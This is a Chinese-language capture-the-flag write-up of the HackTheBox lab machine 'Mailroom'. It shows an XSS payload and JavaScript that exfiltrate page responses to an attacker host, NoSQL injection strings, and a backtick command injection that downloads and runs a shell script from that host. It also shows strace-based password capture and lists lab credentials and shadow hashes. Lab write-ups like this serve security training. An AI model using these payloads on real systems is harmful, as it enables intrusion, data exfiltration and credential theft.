---
title: Mailroom - HackTheBox
url: https://darkwing.moe/2023/04/19/Mailroom-HackTheBox/
source: 喵喵喵喵
date: 2023-04-20
fetch_date: 2025-10-04T11:31:31.450095
---

# Mailroom - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Mailroom - HackTheBox

# Mailroom - HackTheBox

##### 2023-04-19

#### TOC

1. [1. 基本信息](#基本信息)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
3. [3. 子域名扫描](#子域名扫描)
   1. [3.1. git.mailroom.htb](#git-mailroom-htb)
4. [4. gitea](#gitea)
   1. [4.1. auth.php](#auth-php)
   2. [4.2. staff-review-panel](#staff-review-panel)
   3. [4.3. inspect.php](#inspect-php)
5. [5. XSS](#XSS)
   1. [5.1. staff-review-panel](#staff-review-panel-1)
   2. [5.2. nosql注入](#nosql注入)
   3. [5.3. miao.js](#miao-js)
   4. [5.4. auth.js](#auth-js)
6. [6. 命令注入](#命令注入)
7. [7. user flag](#user-flag)
8. [8. 提权信息](#提权信息)
   1. [8.1. keepass](#keepass)
9. [9. root flag](#root-flag)
   1. [9.1. shadow](#shadow)
10. [10. 参考资料](#参考资料)

# Mailroom - HackTheBox

2023-04-19

# 基本信息

* <https://app.hackthebox.com/machines/Mailroom>
* 10.10.11.209

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041701.jpg)

# 端口扫描

22和80:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.209 Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-17 15:01 CST Nmap scan report for 10.10.11.209 Host is up (0.096s latency). Not shown: 998 closed tcp ports (conn-refused) PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   3072 94bb2ffcaeb9b182afd789811aa76ce5 (RSA) |   256 821beb758b9630cf946e7957d9ddeca7 (ECDSA) |_  256 19fb45feb9e4275de5bbf35497dd68cf (ED25519) 80/tcp open  http    Apache httpd 2.4.54 ((Debian)) |_http-server-header: Apache/2.4.54 (Debian) |_http-title: The Mail Room Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 35.10 seconds ``` |

## 80

物流服务,页面底部可以得到域名 `mailroom.htb`：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041702.jpg)

# 子域名扫描

添加hosts后扫描子域名,得到git：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` 10.10.11.209 mailroom.htb  ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://mailroom.htb/" -H 'Host: FUZZ.mailroom.htb' -fs 0,7748  [Status: 200, Size: 13201, Words: 1009, Lines: 268, Duration: 117ms]     * FUZZ: git ``` |

## git.mailroom.htb

同样添加hosts后访问,是一个gitea：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041705.jpg)

# gitea

没开注册，但探索里能直接访问一个repo：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041706.jpg)

## auth.php

查看代码，auth里可以知道用了mongo，并且得到另一个开了2FA的子域名：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` $client = new MongoDB\Client("mongodb://mongodb:27017"); // Connect to the MongoDB database  $message = 'Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=' . $token; ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041707.jpg)

## staff-review-panel

添加hosts尝试外部访问，403：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041708.jpg)

## inspect.php

查看inspect.php发现直接使用shell\_exec,对可控的inquiry\_id存在一些过滤，但注意没有过滤掉反引号：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041711.jpg)

# XSS

简单测试功能，发现contact存在XSS：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041703.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041704.jpg)

## staff-review-panel

那就可以尝试通过XSS让管理员去访问staff-review-panel，把结果发送给我们：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` email=miao%40miao.com&title=miao&message=<script+src%3d"http%3a//10.10.14.4/miao.js"></script> ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041709.jpg)

但还是需要登录的：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041710.jpg)

## nosql注入

利用XSS去打auth.php尝试进行nosql注入,但注入成功后提示2FA在邮件里，所以还是要一步步来最终得到账号密码:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` email[$ne]=1&password[$ne]=1 email[$regex]=^t&password[$ne]=1 email=tristan@mailroom.htb&password[$regex]=^6  tristan  69trisRulez! ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041721.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041722.jpg)

## miao.js

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 ``` | ``` var url = "http://staff-review-panel.mailroom.htb/index.php"; var attacker = "http://10.10.14.4/out"; var xhr  = new XMLHttpRequest(); xhr.onreadystatechange = function() {     if (xhr.readyState == XMLHttpRequest.DONE) {         fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)));     } } xhr.open('GET', url, true); xhr.send(null); ``` |

## auth.js

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 ``` | ``` var url = "http://staff-review-panel.mailroom.htb/auth.php"; var attacker = "http://10.10.14.4/out"; var xhr  = new XMLHttpRequest(); xhr.onreadystatechange = function() {   if (xhr.readyState == XMLHttpRequest.DONE) {     fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)));   } } xhr.open('POST', url); xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); xhr.send('email[$ne]=1&password[$ne]=1'); ``` |

# 命令注入

得到的账号密码可以ssh登录，但还没到user，但已经可以读邮件获取staff-review-panel认证链接：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041723.jpg)

转发本地80端口出来，使用邮件里的2FA链接访问认证后的staff-review-panel，利用inspect.php的命令注入，得到www-data shell

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` sudo ssh tristan@10.10.11.209 -L 80:127.0.0.1:80  inquiry_id=`curl 10.10.14.4/shell -o /tmp/shell` inquiry_id=`bash /tmp/shell` ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041724.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041725.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041712.jpg)

git config里得到matthew账号密码,但并不能直接ssh登录：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` url = http://matthew:HueLover83%23@gitea:3000/matthew/staffroom.git 	 HueLover83# ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041713.jpg)

# user flag

tristan用户SSH session里，使用得到的matthew账号密码su切过去，得到user flag:

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` matthew HueLover83# ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041714.jpg)

# 提权信息

matthew用户目录里发现trista有读权限的personal.kdbx，下载到本地：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` scp tristan@10.10.11.209:/home/matthew/personal.kdbx . ``` |

运行pspy64,发现kpcli,直接strace去获取信息，操作要非常快，根据read中得到的字符还原得到keepass密码：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 ``` | ``` wget http://10.10.14.4:7777/pspy64 chmod +x ./pspy64 ./pspy64  strace -e read -p pid  # \010 is a del character !sEcUr3p4$$w0rd9 ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041718.jpg)

## keepass

使用得到的密码打开kdbx文件，得到root密码：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` # keepass # \010 is a del character !sEcUr3p4$$w0rd9  # root pass a$gBa3!GA8 ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041719.jpg)

# root flag

使用得到的密码su切到root：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023041720.jpg)

## shadow

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` root:$6$eSs/sq0j1FH6EyFi$UJKfsByoNiJoacmC6Ko44cOPuLRn3vX6KfsFDtqCo7EvRYN0mnPMZkDrENFLYZPppr3SsK7K5cHtgTaEu/4ZE.:19430:0:99999:7::: tristan:$6$VcPf8uXhQ1WTXpJp$vn02AxnM7Memo7.SMnM9r.P3vRw93O15zzpFuSwQaIjOkilBYTdo2H/URHyBXVz0tBYZuR4Salj7GueyPHvvA/:19372:0:99999:7::: matthew:$6$2zFwPXOaAMBhFYSV$TaNzocDMNPZ6FIm7C3Egt7bJszN2CwaUrnrDyczRC.hc75cyoMh...